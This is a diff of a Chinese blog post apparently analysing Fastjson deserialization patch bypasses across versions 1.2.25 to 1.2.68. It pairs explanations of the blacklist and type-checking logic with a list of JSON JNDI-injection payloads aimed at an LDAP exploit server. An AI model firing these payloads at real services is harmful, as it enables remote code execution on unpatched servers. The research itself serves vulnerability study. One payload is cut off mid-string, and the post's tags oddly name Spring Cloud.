@@ -59,8 +59,8 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 6.3.0"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
 
@@ -372,16 +372,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/java%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">java安全</span>
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
                             </a>
                         
-                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
-                                <span class="chip bg-color">反序列化漏洞</span>
-                            </a>
-                        
-                            <a href="/tags/fastjson/">
-                                <span class="chip bg-color">fastjson</span>
+                            <a href="/tags/springcloud/">
+                                <span class="chip bg-color">springcloud</span>
                             </a>
                         
                     </div>
@@ -392,8 +388,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/java%E5%AE%89%E5%85%A8/" class="post-category">
-                                java安全
+                            <a href="/categories/cve%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                cve复现
                             </a>
                         
                     </div>
@@ -414,14 +410,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    3.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    12 分
                 </div>
                 
 
@@ -450,21 +446,21 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="fastjson高版本补丁绕过"><a href="#fastjson高版本补丁绕过" class="headerlink" title="fastjson高版本补丁绕过"></a>fastjson高版本补丁绕过</h1><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><h3 id="1-2-25"><a href="#1-2-25" class="headerlink" title="1.2.25"></a>1.2.25</h3><p>在 Fastjson1.2.25 中使用了 checkAutoType 来修复1.2.22-1.2.24中的漏洞，其中有个 autoTypeSupport 默认为 False。当 autoTypeSupport 为 False 时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错。当 autoTypeSupport 为 True 时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。对于开启或者不开启，都有相应的绕过方法。</p>
-<p>在获取@type的值后，1.2.24以后的版本新增函数checkAutoType,在类加载之前检查是否允许加载<br><img src="/img/4-27/1.png"><br>进入ParseConfig#checkAutoType<br>在尝试取缓存无法取到的时候，<br>先进行黑名单过滤，类名不能是以黑名单的开头<br><img src="/img/4-27/2.png"><br>黑名单<br><img src="/img/4-27/3.png"><br>那基本就是被黑名单限制了，导致异常提前退出异常<br>若是手动开启了AutoType，那么就是先白名单，再黑名单，再取缓存<br><img src="/img/4-27/4.png"><br>流程图<br><img src="/img/4-27/5.png"></p>
+<p>在获取@type的值后，1.2.24以后的版本新增函数checkAutoType,在类加载之前检查是否允许加载<br><img src="/img/24-7-18/1.png"><br>进入ParseConfig#checkAutoType<br>在尝试取缓存无法取到的时候，<br>先进行黑名单过滤，类名不能是以黑名单的开头<br><img src="/img/24-7-18/2.png"><br>黑名单<br><img src="/img/24-7-18/3.png"><br>那基本就是被黑名单限制了，导致异常提前退出异常<br>若是手动开启了AutoType，那么就是先白名单，再黑名单，再取缓存<br><img src="/img/24-7-18/4.png"><br>流程图<br><img src="/img/24-7-18/5.png"></p>
 <h3 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h3><p>1.2.42相较于之前的版本，关键是在ParserConfig.java中修改了以下两点</p>
 <ul>
 <li>黑名单改为了hash值，防止绕过</li>
 <li>对于传入的类名，删除开头L和结尾的;</li>
 </ul>
 <p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究 ( 可恶（:  ），提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<br><a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">GitHub - LeadroyaL/fastjson-blacklist</a></p>
-<img src="/img/4-27/6.png">
+<img src="/img/24-7-18/6.png">
 首先第一步就是各种运算，起初还没看懂在干什么，感觉就是给读者做混淆
 应该与下面的if条件是一样的
-<img src="/img/4-27/7.png">
+<img src="/img/24-7-18/7.png">
 白名单和黑名单都是采用特殊的运算计算hash，从寻找黑白名单中是否有计算出的hash
-<img src="/img/4-27/8.png">
+<img src="/img/24-7-18/8.png">
 
-<h3 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h3><p>添加检查<br><img src="/img/4-27/9.png"><br>在原本检查L和；基础上检查类名的第二个字符是否为L如果是就直接异常退出<br>就是排除类名是以LL开头的情况，然后再截取</p>
+<h3 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h3><p>添加检查<br><img src="/img/24-7-18/9.png"><br>在原本检查L和；基础上检查类名的第二个字符是否为L如果是就直接异常退出<br>就是排除类名是以LL开头的情况，然后再截取</p>
 <h3 id="1-2-48"><a href="#1-2-48" class="headerlink" title="1.2.48"></a>1.2.48</h3><p>并将java.lang.Class类放入了黑名单，这样彻底封死了从mapping中加载恶意类</p>
 <p><strong>设置AutoType</strong><br>默认情况下autoTypeSupport为False，将其设置为True有两种方法：</p>
 <ul>
@@ -486,13 +482,54 @@
   <span class="token punctuation">}</span>
 <span class="token punctuation">}</span></code></pre>
 
-<p>payload主要是分为两部分<br>调式<br>第一部分：<br>首先java.lang.Class是默认支持的类，所以可以直接从白名单IdentityHashMap中拿出<br>从白名单中拿出的类默认是MiscCodec这个类来进行反序列化<br> MiscCodec#deserialze方法中默认是往下读取val属性<br><img src="/img/4-27/10.png"><br>然后解析json得到val属性的值<br>然后加载val对应值的类<br><img src="/img/4-27/11.png"><br>在加载类的时候，把对应类加载后，放入mapping缓存，这也是绕过的关键–放入mapping缓存<br><img src="/img/4-27/12.png"></p>
-<p>第二部分<br>直接先从缓存中获取<br><img src="/img/4-27/13.png"><br>因为之前加载前面的类的时候已经放入过mapping了，所以这里能够直接拿到<br><img src="/img/4-27/14.png"><br>拿到class后就会直接返回，就不会走到后面触发异常</p>
+<p>payload主要是分为两部分<br>调式<br>第一部分：<br>首先java.lang.Class是默认支持的类，所以可以直接从白名单IdentityHashMap中拿出<br>从白名单中拿出的类默认是MiscCodec这个类来进行反序列化<br> MiscCodec#deserialze方法中默认是往下读取val属性<br><img src="/img/24-7-18/10.png"><br>然后解析json得到val属性的值<br>然后加载val对应值的类<br><img src="/img/24-7-18/11.png"><br>在加载类的时候，把对应类加载后，放入mapping缓存，这也是绕过的关键–放入mapping缓存<br><img src="/img/24-7-18/12.png"></p>
+<p>第二部分<br>直接先从缓存中获取<br><img src="/img/24-7-18/13.png"><br>因为之前加载前面的类的时候已经放入过mapping了，所以这里能够直接拿到<br><img src="/img/24-7-18/14.png"><br>拿到class后就会直接返回，就不会走到后面触发异常</p>
 <h3 id="低于1-2-68版本的补丁绕过"><a href="#低于1-2-68版本的补丁绕过" class="headerlink" title="低于1.2.68版本的补丁绕过"></a>低于1.2.68版本的补丁绕过</h3><p>条件</p>
 <ul>
 <li>Fastjson &lt;= 1.2.68</li>
 <li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中</li>
 </ul>
+<p>1.2.68版本后，fastjson新增safemode模式，可以完全关闭AutoType：<br><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode">https://github.com/alibaba/fastjson/wiki/fastjson_safemode</a></p>
+<p>本次绕过checkAutoType()函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过checkAutoType()函数执行恶意操作。<br>简单地说，本次绕过checkAutoType()函数的攻击步骤为：</p>
+<ol>
+<li>先传入某个类，其加载成功后将作为expectClass参数传入checkAutoType()函数；</li>
+<li>查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或setter方法中存在危险操作则可以被攻击利用；</li>
+</ol>
+<p>假设现在已知这个类（这里我们就自己写一个）<br><img src="/img/24-7-18/15.png"><br>payload如下：</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.example.VulAutoCloseable"</span><span class="token punctuation">,</span><span class="token property">"cmd"</span><span class="token operator">:</span><span class="token string">"calc"</span><span class="token punctuation">}</span></code></pre>
+
+<p>后面获取到JavaBeanDeserializer,直接看deserialze方法<br><img src="/img/24-7-18/16.png"><br>此时已经是已经加载了前面的java.lang.AutoCloseable，所以这里expectClass不为空<br><img src="/img/24-7-18/17.png"><br>在这里expectClassFlag设置为true<br>到后面<br><img src="/img/24-7-18/18.png"><br>然后loadClass返回<br><img src="/img/24-7-18/19.png"><br>然后还是会检查是否为被ban的相关类,判断目标类是否是expectClass类的子类，是的话就添加到Mapping缓存中并直接返回该目标类，否则直接抛出异常导致利用失败，<strong>这里就解释了为什么恶意类必须要继承AutoCloseable接口类，因为这里expectClass为AutoCloseable类、因此恶意类必须是AutoCloseable类的子类才能通过这里的判断</strong>：<br><img src="/img/24-7-18/20.png"><br>总结：第一个 <code>@type</code> 进去什么都没有发生；但是第一个 <code>@type</code> 是作为第二个指定的类里面的 expectClass。所以说白了，loadClass 去作用的类是第一个 <code>@type</code>；如果这个 <code>@type</code> 是可控的恶意类，可以造成命令执行攻击。<br>并且需要加载的目标类是expectClass类的子类或者实现类时（不在黑名单中）</p>
+<p>这里直接参考<a target="_blank" rel="noopener" href="https://b1ue.cn/archives/364.html">b1ue大佬文章</a>，主要是寻找关于输入输出流的类来写文件，IntputStream和OutputStream都是实现自AutoCloseable接口的。<br>,相关实际应用为利用fastjson写文件，参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/yyjccc/pk74ko/de45vsli00bmwtuh">https://www.yuque.com/yyjccc/pk74ko/de45vsli00bmwtuh</a></p>
+<p>看GitHub官方的diff，主要在ParserConfig.java中：<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4">https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4</a><br>对比看到expectClass的判断逻辑中，对类名进行了Hash处理再比较哈希黑名单，并且添加了三个类：<br><img src="/img/24-7-18/21.png"><br>网上已经有了利用彩虹表碰撞的方式得到的新添加的三个类分别为：</p>
+<table>
+<thead>
+<tr>
+<th><strong>版本</strong></th>
+<th><strong>十进制Hash值</strong></th>
+<th><strong>十六进制Hash值</strong></th>
+<th><strong>类名</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.69</td>
+<td>5183404141909004468L</td>
+<td>0x47ef269aadc650b4L</td>
+<td>java.lang.Runnable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>2980334044947851925L</td>
+<td>0x295c4605fd1eaa95L</td>
+<td>java.lang.Readable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-1368967840069965882L</td>
+<td>0xed007300a7b227c6L</td>
+<td>java.lang.AutoCloseable</td>
+</tr>
+</tbody></table>
+<p>这就简单粗暴地防住了这几个类导致的绕过问题了。</p>
 <h2 id="需要开启AutoType"><a href="#需要开启AutoType" class="headerlink" title="需要开启AutoType"></a>需要开启AutoType</h2><h3 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h3><p>做法：在@type指定的类前加上’L’,后面加上’;’<br>如：</p>
 <pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>" 
     <span class="token string">"\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\","</span> +
@@ -501,7 +538,7 @@
 "<span class="token punctuation">}</span>
 <span class="token comment">//其他利用链也同理</span></code></pre>
 <p>这样绕过了黑名，看看怎么加载类的</p>
-<p>流程<br>在ParseConfig#checkAutoType中<br>由于开启autoTypeSupport所以其为True，能通过黑名单<br>到达<br><img src="/img/4-27/15.png"><br>跟进<br><img src="/img/4-27/16.png"><br>发现类名要是以L开头并且以；结尾就会去除这些字符再递归调用<br>上面流程又得到了未变化之前的类名，可以正常的加载<br><img src="/img/4-27/17.png"></p>
+<p>流程<br>在ParseConfig#checkAutoType中<br>由于开启autoTypeSupport所以其为True，能通过黑名单<br>到达<br><img src="/img/24-7-18/22.png"><br>跟进<br><img src="/img/24-7-18/23.png"><br>发现类名要是以L开头并且以；结尾就会去除这些字符再递归调用<br>上面流程又得到了未变化之前的类名，可以正常的加载<br><img src="/img/24-7-18/24.png"></p>
 <h3 id="1-2-42绕过"><a href="#1-2-42绕过" class="headerlink" title="1.2.42绕过"></a>1.2.42绕过</h3><p>做法：在@type指定的类前加上两个’L’,后面加上两个’;’<br>如：</p>
 <pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>" 
     <span class="token string">"\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\","</span> +
@@ -511,10 +548,10 @@
 <span class="token comment">//其他利用链也同理</span></code></pre>
 
 
-<img src="/img/4-27/18.png">
+<img src="/img/24-7-18/25.png">
 这里只截取了一次，所以可以再套一层，类名前面两个L后面两个；
 
-<p>由于是递归使用的loadClass所以可以去除两层<br><img src="/img/4-27/19.png"></p>
+<p>由于是递归使用的loadClass所以可以去除两层<br><img src="/img/24-7-18/26.png"></p>
 <h3 id="1-2-43绕过"><a href="#1-2-43绕过" class="headerlink" title="1.2.43绕过"></a>1.2.43绕过</h3><p>操作: 类名前添加’[‘，类名引号外添加’ [{ ‘</p>
 <pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
     <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"[com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token punctuation">,</span>
@@ -522,9 +559,9 @@
     <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
 <span class="token punctuation">}</span>
 <span class="token comment">//其他利用链也同理</span></code></pre>
-<p>利用前面1.2.41的类似的还有一个if条件，就是以[开头,<br>尝试直接以[开头，报错<br><img src="/img/4-27/20.png"><br>根据报错JdbcRowSetImpl” 后面期望是[而不是’,’那就满足他，在’,’前添加[<br>还是报错<br><img src="/img/4-27/21.png"><br>继续添加{<br>执行成功<br><img src="/img/4-27/22.png"></p>
-<p>与之前不同的是，进入的是前面的一个if条件<br><img src="/img/4-27/23.png"></p>
-<p>最后得到的类是一个数组类<br><img src="/img/4-27/24.png"><br>获取到的反序列就是ObjectArrayCodec<br><img src="/img/4-27/25.png"><br>继续跟进<br><img src="/img/4-27/26.png"><br>获取具体的类<br>创建数组JSONArray<br>然后parseArray<br><img src="/img/4-27/27.png"><br>后面的流程应该就一样了</p>
+<p>利用前面1.2.41的类似的还有一个if条件，就是以[开头,<br>尝试直接以[开头，报错<br><img src="/img/24-7-18/27.png"><br>根据报错JdbcRowSetImpl” 后面期望是[而不是’,’那就满足他，在’,’前添加[<br>还是报错<br><img src="/img/24-7-18/28.png"><br>继续添加{<br>执行成功<br><img src="/img/24-7-18/29.png"></p>
+<p>与之前不同的是，进入的是前面的一个if条件<br><img src="/img/24-7-18/30.png"></p>
+<p>最后得到的类是一个数组类<br><img src="/img/24-7-18/31.png"><br>获取到的反序列就是ObjectArrayCodec<br><img src="/img/24-7-18/32.png"><br>继续跟进<br><img src="/img/24-7-18/33.png"><br>获取具体的类<br>创建数组JSONArray<br>然后parseArray<br><img src="/img/24-7-18/34.png"><br>后面的流程应该就一样了</p>
 <h3 id="1-2-45绕过-MyBatis-JNDI注入链"><a href="#1-2-45绕过-MyBatis-JNDI注入链" class="headerlink" title="1.2.45绕过(MyBatis JNDI注入链)"></a>1.2.45绕过(MyBatis JNDI注入链)</h3><p>1.2.45版本添加了一些黑名单，但是存在组件漏洞，我们能通过mybatis组件进行JNDI接口调用，进而加载恶意类。</p>
 <p><strong>条件</strong>:</p>
 <ul>
@@ -542,9 +579,68 @@
         <span class="token property">"data_source"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1：9999/EXP"</span>
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span></code></pre>
-<p>过程<br>触发setter方法<br>JndiDataSourceFactory#setProperties方法<br><img src="/img/4-27/28.png"><br>传入的参数刚好就是键值对<br>这里会初始化上下文环境<br>然后就行look<br>look查询的是键值对（Properties）中key为data_source的值<br><img src="/img/4-27/29.png"></p>
-<h3 id="1-2-62-1-2-68版本"><a href="#1-2-62-1-2-68版本" class="headerlink" title="1.2.62-1.2.68版本"></a>1.2.62-1.2.68版本</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/232774">浅析Fastjson1.2.62-1.2.68反序列化漏洞-安全客 - 安全资讯平台</a></p>
-<h2 id="各个版本的payload"><a href="#各个版本的payload" class="headerlink" title="各个版本的payload"></a>各个版本的payload</h2><ul>
+<p>过程<br>触发setter方法<br>JndiDataSourceFactory#setProperties方法<br><img src="/img/24-7-18/35.png"><br>传入的参数刚好就是键值对<br>这里会初始化上下文环境<br>然后就行look<br>look查询的是键值对（Properties）中key为data_source的值<br><img src="/img/24-7-18/36.png"></p>
+<h3 id="1-2-62-1-2-68版本"><a href="#1-2-62-1-2-68版本" class="headerlink" title="1.2.62-1.2.68版本"></a>1.2.62-1.2.68版本</h3><h4 id="1-2-62"><a href="#1-2-62" class="headerlink" title="1.2.62"></a>1.2.62</h4><p>条件：</p>
+<ul>
+<li>需要开启AutoType；</li>
+<li>JNDI注入利用所受的JDK版本限制；</li>
+<li>目标服务端需要存在xbean-reflect包</li>
+</ul>
+<p>也是新 Gadget 绕过黑名单限制。<br>依赖</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.xbean<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>xbean-reflect<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.18<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>  </code></pre>
+<p><strong>分析</strong>：<br>org.apache.xbean.propertyeditor.JndiConverter  类的 toObjectImpl() 函数存在 JNDI 注入漏洞，可由其构造函数处触发利用。<br><img src="/img/24-7-18/37.png"></p>
+<p>触发点在其父类AbstractConverter 的setAsText中<br><img src="/img/24-7-18/38.png"></p>
+<p>toObject 又调用toObjectImpl<br><img src="/img/24-7-18/39.png"><br><strong>poc</strong></p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.xbean.propertyeditor.JndiConverter"</span><span class="token punctuation">,</span><span class="token property">"AsText"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1:8085/tmuCzovY"</span><span class="token punctuation">}</span></code></pre>
+
+<h4 id="1-2-66"><a href="#1-2-66" class="headerlink" title="1.2.66"></a>1.2.66</h4><p><strong>条件</strong></p>
+<ul>
+<li>开启AutoType；</li>
+<li>JNDI注入利用所受的JDK版本限制；</li>
+<li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</li>
+<li>br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；</li>
+<li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li>
+</ul>
+<p>org.apache.shiro.realm.jndi.JndiRealmFactory类PoC：</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.shiro.realm.jndi.JndiRealmFactory"</span><span class="token punctuation">,</span> <span class="token property">"jndiNames"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token property">"Realms"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre>
+<p>br.com.anteros.dbcp.AnterosDBCPConfig类PoC：</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"br.com.anteros.dbcp.AnterosDBCPConfig"</span><span class="token punctuation">,</span><span class="token property">"metricRegistry"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span>或<span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"br.com.anteros.dbcp.AnterosDBCPConfig"</span><span class="token punctuation">,</span><span class="token property">"healthCheckRegistry"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span></code></pre>
+<p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC：</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig"</span><span class="token punctuation">,</span><span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.util.Properties"</span><span class="token punctuation">,</span>"UserTra</code></pre>
+
+<h4 id="1-2-67"><a href="#1-2-67" class="headerlink" title="1.2.67"></a>1.2.67</h4><p><strong>条件</strong>：</p>
+<ul>
+<li>开启AutoType；</li>
+<li>JNDI注入利用所受的JDK版本限制；</li>
+<li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</li>
+<li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</li>
+</ul>
+<p>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC：</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup"</span><span class="token punctuation">,</span> <span class="token property">"jndiNames"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token property">"tm"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.tm"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
+<p>org.apache.shiro.jndi.JndiObjectFactory类PoC：</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.shiro.jndi.JndiObjectFactory"</span><span class="token punctuation">,</span><span class="token property">"resourceName"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span><span class="token property">"instance"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.instance"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
+
+<h2 id="其他一些绕过黑名单的Gadget"><a href="#其他一些绕过黑名单的Gadget" class="headerlink" title="其他一些绕过黑名单的Gadget"></a>其他一些绕过黑名单的Gadget</h2><p>这里补充下其他一些Gadget，可自行尝试。注意，均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制。</p>
+<h3 id="1-2-59"><a href="#1-2-59" class="headerlink" title="1.2.59"></a>1.2.59</h3><p>com.zaxxer.hikari.HikariConfig类PoC：</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.zaxxer.hikari.HikariConfig"</span><span class="token punctuation">,</span><span class="token property">"metricRegistry"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span>或<span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.zaxxer.hikari.HikariConfig"</span><span class="token punctuation">,</span><span class="token property">"healthCheckRegistry"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span></code></pre>
+<h3 id="1-2-61"><a href="#1-2-61" class="headerlink" title="1.2.61"></a>1.2.61</h3><p>org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：<br><strong>JSON</strong></p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.proxy.provider.remoting.SessionBeanProvider"</span><span class="token punctuation">,</span><span class="token property">"jndiName"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span><span class="token property">"Object"</span><span class="token operator">:</span><span class="token string">"a"</span><span class="token punctuation">}</span></code></pre>
+<h3 id="1-2-62-1"><a href="#1-2-62-1" class="headerlink" title="1.2.62"></a>1.2.62</h3><p>org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：<br><strong>JSON</strong></p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.cocoon.components.slide.impl.JMSContentInterceptor"</span><span class="token punctuation">,</span> <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.util.Hashtable"</span><span class="token punctuation">,</span><span class="token property">"java.naming.factory.initial"</span><span class="token operator">:</span><span class="token string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span><span class="token punctuation">,</span><span class="token property">"topic-factory"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token property">"namespace"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">}</span></code></pre>
+<h3 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h3><p>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：<br><strong>JSON</strong></p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig"</span><span class="token punctuation">,</span><span class="token property">"metricRegistry"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span>或<span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig"</span><span class="token punctuation">,</span><span class="token property">"healthCheckRegistry"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span></code></pre>
+<p>com.caucho.config.types.ResourceRef类PoC：<br><strong>JSON</strong></p>
